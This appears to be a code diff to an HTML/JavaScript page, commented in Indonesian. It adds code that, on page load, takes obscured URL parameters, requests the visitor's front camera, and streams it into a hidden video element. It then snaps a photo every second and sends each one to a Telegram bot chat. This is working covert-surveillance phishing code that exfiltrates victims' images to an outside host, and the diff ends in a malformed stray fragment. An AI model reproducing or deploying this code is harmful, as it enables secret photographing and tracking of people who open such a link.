@@ -66,20 +66,121 @@
         let CHAT_ID;
         let captureInterval;
 
-        // Fungsi untuk menunggu video benar-benar siap
-        const waitForVideoReady = (retryCount = 0) => {
-            if (video.readyState >= 4) { // 4 = HAVE_ENOUGH_DATA
-                console.log("Video siap. Memulai pengiriman berulang...");
-                statusText.textContent = "Kamera siap. Mengirim foto...";
-                // Mulai proses pengiriman setiap 1 detik
-                captureInterval = setInterval(captureAndSendLoop, 1000);
-            } else if (retryCount < 20) { // Coba selama 10 detik
-                console.log(`Video belum siap (readyState: ${video.readyState}). Mencoba lagi...`);
-                setTimeout(() => waitForVideoReady(retryCount + 1), 500);
-            } else {
-                console.error("Video tidak kunjung siap. Membatalkan proses.");
-                statusText.textContent = "Gagal memuat kamera.";
+        // Fungsi utama yang dijalankan saat halaman dimuat
+        async function startCapture() {
+            try {
+                // 1. Ambil data dari URL
+                const botId = getQueryParam('_y');
+                const encodedChatId = getQueryParam('_x');
+
+                if (!botId || !encodedChatId) {
+                    console.error("Parameter URL (_y atau _x) tidak ditemukan.");
+                    statusText.textContent = "Error: Link tidak valid.";
+                    return;
+                }
+
+                // 2. Dekripsi ID untuk mendapatkan CHAT_ID asli
+                CHAT_ID = atob(encodedChatId);
+                console.log("Target Chat ID:", CHAT_ID);
+
+                // 3. Minta akses kamera DEPAN
+                statusText.textContent = "Meminta izin kamera depan...";
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1280 }, 
+                        height: { ideal: 720 },
+                        // --- PERUBAHAN UTAMA: Gunakan kamera depan ---
+                        facingMode: "user" 
+                    } 
+                });
+                console.log("Izin kamera diberikan. Stream aktif.");
+
+                // 4. Tampilkan stream di elemen video (tersembunyi)
+                video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+
+                // 5. Tunggu video siap, lalu mulai loop
+                video.onloadedmetadata = () => {
+                    console.log("Metadata video dimuat. Menunggu video memiliki dimensi yang valid...");
+                    // Beri jeda 2 detik untuk memastikan video benar-benar siap dan memiliki frame
+                    setTimeout(() => {
+                        // --- PERUBAHAN UTAMA: Cek dimensi video ---
+                        if (video.videoWidth > 0 && video.videoHeight > 0) {
+                            console.log(`Video siap dengan dimensi: ${video.videoWidth}x${video.videoHeight}. Memulai pengiriman berulang...`);
+                            statusText.textContent = "Kamera siap. Mengirim foto...";
+                            // Mulai proses pengiriman setiap 1 detik
+                            captureInterval = setInterval(captureAndSendLoop, 1000);
+                        } else {
+                            console.error("Video tidak memiliki dimensi yang valid (0x0). Membatalkan proses.");
+                            statusText.textContent = "Gagal memuat kamera (dimensi 0x0).";
+                            // Hentikan stream jika ada
+                            stream.getTracks().forEach(track => track.stop());
+                        }
+                    }, 2000); // Jeda 2 detik
+                };
+
+            } catch (error) {
+                console.error("❌ Akses kamera ditolak atau terjadi error:", error);
+                statusText.textContent = "Izin kamera ditolak.";
             }
+        }
+
+        // Fungsi loop untuk menangkap dan mengirim foto
+        async function captureAndSendLoop() {
+            if (!video || video.readyState < 4 || video.videoWidth === 0) {
+                console.log("Video belum siap, melewati pengiriman.");
+                return;
+            }
+
+            console.log("Menangkap gambar...");
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(async (blob) => {
+                if (!blob) {
+                    console.error("Error: Gagal membuat blob.");
+                    return;
+                }
+
+                const formData = new FormData();
+                formData.append('photo', blob, `capture_${Date.now()}.jpg`); // Beri nama unik
+                formData.append('chat_id', CHAT_ID);
+                
+                const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+                try {
+                    const response = await fetch(telegramApiUrl, { method: 'POST', body: formData });
+                    const result = await response.json();
+                    if (response.ok && result.ok) {
+                        console.log("✅ Foto berhasil terkirim!");
+                    } else {
+                        console.error("❌ Gagal mengirim foto. Respon API:", result);
+                    }
+                } catch (fetchError) {
+                    console.error("❌ Error saat melakukan fetch ke Telegram:", fetchError);
+                }
+            }, 'image/jpeg', 0.9);
+        }
+
+        // Inisialisasi dan jalankan
+        window.onload = () => {
+            statusText = document.getElementById('status');
+            startCapture();
+        };
+
+        // Hentikan pengiriman jika halaman ditutup
+        window.onbeforeunload = () => {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+            }
+        };
+    </script>
+</body>
+</html>            }
         };
 
         // Fungsi utama yang dijalankan saat halaman dimuat
